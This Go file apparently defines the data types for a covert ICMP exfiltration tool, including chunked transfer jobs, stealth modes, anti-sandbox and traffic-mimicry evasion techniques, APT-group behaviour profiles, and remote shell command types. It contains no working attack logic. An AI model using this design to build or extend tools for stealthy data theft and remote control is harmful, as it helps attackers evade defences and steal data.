package types

import (
	"time"
)

// ExfiltrationMethod represents different exfiltration methods
type ExfiltrationMethod string

const (
	ExfilICMPTunnel  ExfiltrationMethod = "icmp_tunnel"
	ExfilICMPPayload ExfiltrationMethod = "icmp_payload"
	ExfilICMPTiming  ExfiltrationMethod = "icmp_timing"
	ExfilICMPSeq     ExfiltrationMethod = "icmp_sequence"
)

// ExfiltrationMode represents different operation modes
type ExfiltrationMode string

const (
	ModeStealth   ExfiltrationMode = "stealth"
	ModeFast      ExfiltrationMode = "fast"
	ModeReliable  ExfiltrationMode = "reliable"
	ModeCovert    ExfiltrationMode = "covert"
)

// EvasionTechnique represents available evasion techniques
type EvasionTechnique string

const (
	TechCryptoAgility     EvasionTechnique = "crypto_agility"
	TechAntiSandbox       EvasionTechnique = "anti_sandbox"
	TechTimingEvasion     EvasionTechnique = "timing_evasion"
	TechTrafficPadding    EvasionTechnique = "traffic_padding"
	TechDataObfuscation   EvasionTechnique = "data_obfuscation"
	TechBehavioralMimicry EvasionTechnique = "behavioral_mimicry"
)

// APTProfile represents threat actor profiles
type APTProfile string

const (
	APTLazarus  APTProfile = "lazarus"
	APTAPT29    APTProfile = "apt29"
	APTAPT28    APTProfile = "apt28"
	APTEquation APTProfile = "equation"
)

// CryptoAlgorithm represents supported crypto algorithms
type CryptoAlgorithm string

const (
	CryptoAES256    CryptoAlgorithm = "aes256"
	CryptoChaCha20  CryptoAlgorithm = "chacha20"
	CryptoCustomXOR CryptoAlgorithm = "custom_xor"
	CryptoRSAHybrid CryptoAlgorithm = "rsa_hybrid"
)

// ChunkStatus represents the status of data chunks
type ChunkStatus string

const (
	StatusPending      ChunkStatus = "pending"
	StatusSending      ChunkStatus = "sending"
	StatusSent         ChunkStatus = "sent"
	StatusAcknowledged ChunkStatus = "acknowledged"
	StatusFailed       ChunkStatus = "failed"
)

// DataChunk represents a chunk of data for transmission
type DataChunk struct {
	ID          int         `json:"id"`
	Data        []byte      `json:"data"`
	TotalChunks int         `json:"total_chunks"`
	Checksum    string      `json:"checksum"`
	Status      ChunkStatus `json:"status"`
	Timestamp   time.Time   `json:"timestamp"`
	RetryCount  int         `json:"retry_count"`
}

// ExfilJob represents an exfiltration job
type ExfilJob struct {
	ID               string             `json:"id"`
	SourcePath       string             `json:"source_path,omitempty"`
	Data             []byte             `json:"data,omitempty"`
	Target           string             `json:"target"`
	Method           ExfiltrationMethod `json:"method"`
	Mode             ExfiltrationMode   `json:"mode"`
	ChunkSize        int                `json:"chunk_size"`
	MaxRetries       int                `json:"max_retries"`
	StealthEnabled   bool               `json:"stealth_enabled"`
	EncryptEnabled   bool               `json:"encrypt_enabled"`
	Metadata         map[string]any     `json:"metadata"`
	CreatedAt        time.Time          `json:"created_at"`
}

// ExfilResult represents the result of an exfiltration
type ExfilResult struct {
	JobID        string            `json:"job_id"`
	Success      bool              `json:"success"`
	ChunksSent   int               `json:"chunks_sent"`
	ChunksTotal  int               `json:"chunks_total"`
	BytesSent    int64             `json:"bytes_sent"`
	Duration     time.Duration     `json:"duration"`
	Errors       []string          `json:"errors"`
	Metadata     map[string]any    `json:"metadata"`
	CompletedAt  time.Time         `json:"completed_at"`
}

// NetworkPacket represents a network packet
type NetworkPacket struct {
	Payload   []byte            `json:"payload"`
	Headers   map[string]any    `json:"headers"`
	Checksum  uint16            `json:"checksum,omitempty"`
	Metadata  PacketMetadata    `json:"metadata"`
}

// PacketMetadata contains packet metadata
type PacketMetadata struct {
	Timestamp    time.Time `json:"timestamp"`
	SourceIP     string    `json:"source_ip,omitempty"`
	DestIP       string    `json:"dest_ip,omitempty"`
	Protocol     string    `json:"protocol"`
	Size         int       `json:"size"`
	SequenceID   uint16    `json:"sequence_id,omitempty"`
	SessionID    string    `json:"session_id,omitempty"`
	Priority     string    `json:"priority"`
	Retries      int       `json:"retries"`
	MaxRetries   int       `json:"max_retries"`
}

// NetworkMetrics represents network performance metrics
type NetworkMetrics struct {
	PacketsSent      int64     `json:"packets_sent"`
	PacketsReceived  int64     `json:"packets_received"`
	BytesTransmitted int64     `json:"bytes_transmitted"`
	BytesReceived    int64     `json:"bytes_received"`
	Errors           int64     `json:"errors"`
	LatencyMs        float64   `json:"latency_ms"`
	ThroughputBps    float64   `json:"throughput_bps"`
	LastUpdated      time.Time `json:"last_updated"`
}

// SecurityEvent represents a security event for logging
type SecurityEvent struct {
	EventType     string            `json:"event_type"`
	Severity      string            `json:"severity"`
	Message       string            `json:"message"`
	Timestamp     time.Time         `json:"timestamp"`
	SessionID     string            `json:"session_id,omitempty"`
	TargetIP      string            `json:"target_ip,omitempty"`
	Technique     string            `json:"technique,omitempty"`
	Component     string            `json:"component,omitempty"`
	Metadata      map[string]any    `json:"metadata"`
	SecurityLevel string            `json:"security_level"`
}

// EvasionResult represents the result of an evasion technique
type EvasionResult struct {
	Technique    EvasionTechnique  `json:"technique"`
	Success      bool              `json:"success"`
	Confidence   float64           `json:"confidence"`
	Metadata     map[string]any    `json:"metadata"`
	ExecutionTime time.Duration    `json:"execution_time"`
	Timestamp    time.Time         `json:"timestamp"`
}

// TimingProfile represents timing behavior profile
type TimingProfile struct {
	MinDelay         time.Duration `json:"min_delay"`
	MaxDelay         time.Duration `json:"max_delay"`
	JitterFactor     float64       `json:"jitter_factor"`
	BurstProbability float64       `json:"burst_probability"`
	PauseProbability float64       `json:"pause_probability"`
	ActivityPattern  []float64     `json:"activity_pattern"`
}

// APTProfileConfig represents APT profile configuration
type APTProfileConfig struct {
	Description      string          `json:"description"`
	TimingRange      [2]int          `json:"timing_range"` // [min, max] in seconds
	SizeRange        [2]int          `json:"size_range"`   // [min, max] bytes
	CryptoPreference CryptoAlgorithm `json:"crypto_preference"`
	Sophistication   string          `json:"sophistication"`
}

// SandboxDetectionResult represents sandbox detection results
type SandboxDetectionResult struct {
	IsSandbox   bool                    `json:"is_sandbox"`
	Confidence  float64                 `json:"confidence"`
	Indicators  []string                `json:"indicators"`
	Details     map[string]any          `json:"details"`
	CheckedAt   time.Time               `json:"checked_at"`
}

// ShellCommand represents a shell command
type ShellCommand struct {
	ID         string    `json:"id"`
	Type       string    `json:"type"`
	Command    string    `json:"command"`
	Args       []string  `json:"args"`
	WorkingDir string    `json:"working_dir,omitempty"`
	Timeout    int       `json:"timeout"`
	Timestamp  time.Time `json:"timestamp"`
}

// ShellResponse represents a shell command response
type ShellResponse struct {
	CommandID     string        `json:"command_id"`
	Success       bool          `json:"success"`
	Stdout        string        `json:"stdout"`
	Stderr        string        `json:"stderr"`
	ReturnCode    int           `json:"return_code"`
	ExecutionTime time.Duration `json:"execution_time"`
	Timestamp     time.Time     `json:"timestamp"`
}